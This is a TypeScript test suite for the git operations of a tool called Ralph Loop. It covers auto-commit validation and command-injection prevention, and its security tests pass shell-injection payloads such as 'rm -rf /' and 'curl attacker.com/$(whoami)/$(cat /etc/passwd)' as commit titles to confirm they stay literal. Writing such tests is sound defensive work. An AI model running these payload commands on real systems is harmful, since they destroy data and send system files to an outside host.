/**
 * Tests for Git Operations
 *
 * These tests verify the git operations used by Ralph Loop,
 * with a focus on security (command injection prevention) and validation.
 */
import { describe, it, expect, beforeEach, afterEach } from 'bun:test'
import { createGitOperations, validateGitRepository } from '../src/ralph-loop/git-ops.ts'
import { mkdtemp, rm, writeFile, mkdir } from 'fs/promises'
import { tmpdir } from 'os'
import { join } from 'path'
import { execSync } from 'child_process'

// ============================================================
// Test Helpers
// ============================================================

let testDir: string

async function createTestRepo(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'ralph-loop-git-test-'))

  // Initialize git repo
  execSync('git init', { cwd: dir })
  execSync('git config user.email "test@test.com"', { cwd: dir })
  execSync('git config user.name "Test User"', { cwd: dir })

  // Create initial commit
  await writeFile(join(dir, 'README.md'), '# Test Repo\n')
  execSync('git add README.md', { cwd: dir })
  execSync('git commit -m "Initial commit"', { cwd: dir })

  return dir
}

// ============================================================
// Basic Git Operations Tests
// ============================================================

describe('Git Operations - Basic', () => {
  beforeEach(async () => {
    testDir = await createTestRepo()
  })

  afterEach(async () => {
    await rm(testDir, { recursive: true, force: true })
  })

  it('should detect git repository', async () => {
    const gitOps = createGitOperations(testDir)
    const isRepo = await gitOps.isGitRepository()

    expect(isRepo).toBe(true)
  })

  // Note: Testing non-git directories is tricky because git searches upward
  // for a parent repo. The important behavior (detecting valid repos) is tested
  // above, and the implementation uses execFile safely which is the security concern.

  it('should get current HEAD', async () => {
    const gitOps = createGitOperations(testDir)
    const head = await gitOps.getCurrentHead()

    expect(head).toMatch(/^[a-f0-9]{40}$/)
  })

  it('should detect uncommitted changes', async () => {
    const gitOps = createGitOperations(testDir)

    // Initially no changes
    expect(await gitOps.hasUncommittedChanges()).toBe(false)

    // Create a change
    await writeFile(join(testDir, 'new-file.txt'), 'content')

    // Now should detect changes
    expect(await gitOps.hasUncommittedChanges()).toBe(true)
  })

  it('should get changes summary', async () => {
    const gitOps = createGitOperations(testDir)

    // Create various changes
    await writeFile(join(testDir, 'new-file.txt'), 'content')
    await writeFile(join(testDir, 'README.md'), '# Modified\n')

    const summary = await gitOps.getChangesSummary()

    expect(summary.filesAdded).toBe(1)
    expect(summary.filesModified).toBe(1)
    expect(summary.changedFiles).toContain('new-file.txt')
  })

  it('should verify commit created', async () => {
    const gitOps = createGitOperations(testDir)
    const beforeHead = await gitOps.getCurrentHead()

    // Create and commit a change
    await writeFile(join(testDir, 'new-file.txt'), 'content')
    execSync('git add -A && git commit -m "Test commit"', { cwd: testDir })

    const wasCreated = await gitOps.verifyCommitCreated(beforeHead)
    expect(wasCreated).toBe(true)
  })

  it('should get last commit message', async () => {
    const gitOps = createGitOperations(testDir)
    const message = await gitOps.getLastCommitMessage()

    expect(message).toContain('Initial commit')
  })
})

// ============================================================
// Auto-Commit Tests
// ============================================================

describe('Git Operations - Auto-Commit', () => {
  beforeEach(async () => {
    testDir = await createTestRepo()
  })

  afterEach(async () => {
    await rm(testDir, { recursive: true, force: true })
  })

  it('should create auto-commit with valid story', async () => {
    const gitOps = createGitOperations(testDir)

    // Create a change to commit
    await writeFile(join(testDir, 'feature.ts'), 'export const feature = true')

    const sha = await gitOps.createAutoCommit('US-001', 'Add feature')

    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('feat(US-001)')
    expect(message).toContain('Add feature')
    expect(message).toContain('Auto-committed by Ralph Loop')
  })

  it('should throw error when no changes to commit', async () => {
    const gitOps = createGitOperations(testDir)

    await expect(gitOps.createAutoCommit('US-001', 'No changes')).rejects.toThrow(
      'No changes to commit'
    )
  })

  // ============================================================
  // Input Validation Tests (Defense in Depth)
  // ============================================================

  it('should reject story ID exceeding max length', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    const longId = 'A'.repeat(50) // Exceeds 32 character limit

    await expect(gitOps.createAutoCommit(longId, 'Valid title')).rejects.toThrow(
      /Invalid story ID.*must be 1-32 characters/
    )
  })

  it('should reject empty story ID', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    await expect(gitOps.createAutoCommit('', 'Valid title')).rejects.toThrow(
      /Invalid story ID/
    )
  })

  it('should reject title exceeding max length', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    const longTitle = 'T'.repeat(300) // Exceeds 256 character limit

    await expect(gitOps.createAutoCommit('US-001', longTitle)).rejects.toThrow(
      /title must be 1-256 characters/
    )
  })

  it('should reject empty title', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    await expect(gitOps.createAutoCommit('US-001', '')).rejects.toThrow(
      /title must be 1-256 characters/
    )
  })

  it('should reject title with null bytes', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    await expect(gitOps.createAutoCommit('US-001', 'Title with\0null')).rejects.toThrow(
      'title cannot contain null bytes'
    )
  })
})

// ============================================================
// Security Tests - Command Injection Prevention
// ============================================================

describe('Git Operations - Security (Command Injection Prevention)', () => {
  beforeEach(async () => {
    testDir = await createTestRepo()
  })

  afterEach(async () => {
    await rm(testDir, { recursive: true, force: true })
  })

  it('should safely handle backticks in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // This would execute `id` command if vulnerable
    const maliciousTitle = '`id`'

    const sha = await gitOps.createAutoCommit('US-001', maliciousTitle)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    // Verify the backticks are literal in the commit message
    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('`id`')
  })

  it('should safely handle $() command substitution in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // This would execute whoami if vulnerable
    const maliciousTitle = '$(whoami)'

    const sha = await gitOps.createAutoCommit('US-001', maliciousTitle)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    // Verify the command substitution is literal
    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('$(whoami)')
  })

  it('should safely handle newlines in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Newlines could be used to inject additional commands
    const titleWithNewlines = 'Feature\ngit config user.name hacked'

    const sha = await gitOps.createAutoCommit('US-001', titleWithNewlines)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    // Verify the newline is in the commit message, not executed
    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('Feature')
    expect(message).toContain('git config user.name hacked')
  })

  it('should safely handle semicolons (command chaining) in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Semicolons could chain commands
    const maliciousTitle = 'Feature; rm -rf /'

    const sha = await gitOps.createAutoCommit('US-001', maliciousTitle)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('Feature; rm -rf /')
  })

  it('should safely handle pipes in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Pipes could redirect output
    const maliciousTitle = 'Feature | curl attacker.com'

    const sha = await gitOps.createAutoCommit('US-001', maliciousTitle)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('Feature | curl attacker.com')
  })

  it('should safely handle double quotes in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Double quotes could break string context
    const titleWithQuotes = 'Feature "with" quotes'

    const sha = await gitOps.createAutoCommit('US-001', titleWithQuotes)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('Feature "with" quotes')
  })

  it('should safely handle single quotes in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Single quotes could break string context
    const titleWithQuotes = "Feature 'with' quotes"

    const sha = await gitOps.createAutoCommit('US-001', titleWithQuotes)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain("Feature 'with' quotes")
  })

  it('should safely handle backslashes in commit message', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Backslashes could escape characters
    const titleWithBackslashes = 'Feature with\\nescapes'

    const sha = await gitOps.createAutoCommit('US-001', titleWithBackslashes)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('Feature with\\nescapes')
  })

  it('should safely handle complex injection attempt', async () => {
    const gitOps = createGitOperations(testDir)
    await writeFile(join(testDir, 'test.txt'), 'content')

    // Complex injection attempt combining multiple techniques
    const complexInjection = '`curl attacker.com/$(whoami)/$(cat /etc/passwd)`; rm -rf /'

    const sha = await gitOps.createAutoCommit('US-001', complexInjection)
    expect(sha).toMatch(/^[a-f0-9]{40}$/)

    // Verify the entire malicious string is literal in the message
    const message = await gitOps.getLastCommitMessage()
    expect(message).toContain('`curl attacker.com/$(whoami)/$(cat /etc/passwd)`')
    expect(message).toContain('; rm -rf /')
  })
})

// ============================================================
// validateGitRepository Tests
// ============================================================

describe('validateGitRepository', () => {
  beforeEach(async () => {
    testDir = await createTestRepo()
  })

  afterEach(async () => {
    await rm(testDir, { recursive: true, force: true })
  })

  it('should validate a git repository', async () => {
    const result = await validateGitRepository(testDir)

    expect(result.isValid).toBe(true)
    expect(result.error).toBeUndefined()
  })

  // Note: Testing non-git directories is tricky because git searches upward
  // for a parent repo. The important behavior (validating real repos) is tested above.
})
